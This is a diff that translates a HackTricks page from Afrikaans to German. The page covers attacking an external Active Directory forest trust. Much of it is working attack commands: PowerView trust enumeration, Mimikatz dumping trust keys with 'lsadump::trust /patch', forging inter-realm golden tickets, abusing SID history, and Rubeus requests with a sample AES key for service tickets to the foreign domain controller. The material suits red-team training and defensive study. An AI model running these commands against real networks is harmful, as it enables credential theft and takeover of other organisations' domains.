@@ -1,25 +1,25 @@
-# Eksterne Woud-Domein - Eenrigting (Inkomend) of bidireksioneel
+# Externer Forest-Domain - Einweg (Inbound) oder bidirektional
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstütze HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
 {% endhint %}
 
-In hierdie scenario vertrou 'n eksterne domein jou (of albei vertrou mekaar), sodat jy 'n soort toegang daaroor kan kry.
+In diesem Szenario vertraut dir eine externe Domäne (oder beide vertrauen sich gegenseitig), sodass du eine Art Zugriff darauf erhalten kannst.
 
-## Enumerasie
+## Aufzählung
 
-Eerstens moet jy die **enumerate** die **vertroue**:
+Zuerst musst du die **Vertrauensstellung** **aufzählen**:
 ```powershell
 Get-DomainTrust
 SourceName      : a.domain.local   --> Current domain
@@ -69,13 +69,13 @@ IsDomain     : True
 # You may also enumerate where foreign groups and/or users have been assigned
 # local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
 ```
-In die vorige enumerasie is gevind dat die gebruiker **`crossuser`** binne die **`External Admins`** groep is wat **Admin toegang** het binne die **DC van die eksterne domein**.
+In der vorherigen Enumeration wurde festgestellt, dass der Benutzer **`crossuser`** in der Gruppe **`External Admins`** ist, die **Admin-Zugriff** im **DC der externen Domäne** hat.
 
-## Aanvanklike Toegang
+## Initialer Zugriff
 
-As jy **nie** enige **spesiale** toegang van jou gebruiker in die ander domein kon vind nie, kan jy steeds teruggaan na die AD Metodologie en probeer om **privesc van 'n onprivilegieerde gebruiker** te doen (goed soos kerberoasting byvoorbeeld):
+Wenn Sie **keinen** **besonderen** Zugriff Ihres Benutzers in der anderen Domäne finden konnten, können Sie immer noch zur AD-Methodologie zurückkehren und versuchen, **privesc von einem unprivilegierten Benutzer** durchzuführen (Dinge wie Kerberoasting zum Beispiel):
 
-Jy kan **Powerview funksies** gebruik om die **ander domein** te **enumerate** met die `-Domain` param soos in:
+Sie können **Powerview-Funktionen** verwenden, um die **andere Domäne** mit dem `-Domain`-Parameter zu **enumerieren**, wie in:
 ```powershell
 Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 ```
@@ -83,28 +83,28 @@ Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
 [.](./)
 {% endcontent-ref %}
 
-## Vervalsing
+## Identitätsübernahme
 
-### Aanmelding
+### Anmelden
 
-Deur 'n gewone metode te gebruik met die geloofsbriewe van die gebruikers wat toegang het tot die eksterne domein, behoort jy toegang te hê tot:
+Mit einer regulären Methode unter Verwendung der Anmeldeinformationen der Benutzer, die Zugriff auf die externe Domäne haben, sollten Sie in der Lage sein, auf Folgendes zuzugreifen:
 ```powershell
 Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
 ```
-### SID Geskiedenis Misbruik
+### SID-Historie-Missbrauch
 
-Jy kan ook [**SID Geskiedenis**](sid-history-injection.md) oor 'n woud vertroue misbruik.
+Sie könnten auch [**SID-Historie**](sid-history-injection.md) über ein Forest-Vertrauen missbrauchen.
 
-As 'n gebruiker **van een woud na 'n ander** gemigreer word en **SID Filtrering nie geaktiveer is nie**, word dit moontlik om **'n SID van die ander woud** toe te voeg, en hierdie **SID** sal by die **gebruiker se token** gevoeg word wanneer hulle **oor die vertroue** autentiseer.
+Wenn ein Benutzer **von einem Forest zu einem anderen** migriert wird und **SID-Filterung nicht aktiviert ist**, wird es möglich, eine **SID aus dem anderen Forest** hinzuzufügen, und diese **SID** wird dem **Token des Benutzers** beim Authentifizieren **über das Vertrauen** hinzugefügt.
 
 {% hint style="warning" %}
-As 'n herinnering, jy kan die ondertekeningssleutel kry met
+Zur Erinnerung, Sie können den Signaturschlüssel mit
 ```powershell
 Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
 ```
 {% endhint %}
 
-Jy kan **onderteken met** die **vertroude** sleutel 'n **TGT wat die** gebruiker van die huidige domein **naboots**.
+Sie könnten mit dem **vertrauenswürdigen** Schlüssel ein **TGT, das** den Benutzer der aktuellen Domäne **nachahmt**, signieren.
 ```bash
 # Get a TGT for the cross-domain privileged user to the other domain
 Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'
@@ -115,7 +115,7 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
-### Volledige manier om die gebruiker na te volg
+### Vollständige Möglichkeit, den Benutzer zu impersonieren
 ```bash
 # Get a TGT of the user with cross-domain permissions
 Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap
@@ -130,16 +130,16 @@ Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /d
 # Now you have a TGS to access the CIFS service of the domain controller
 ```
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstütze HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
 {% endhint %}
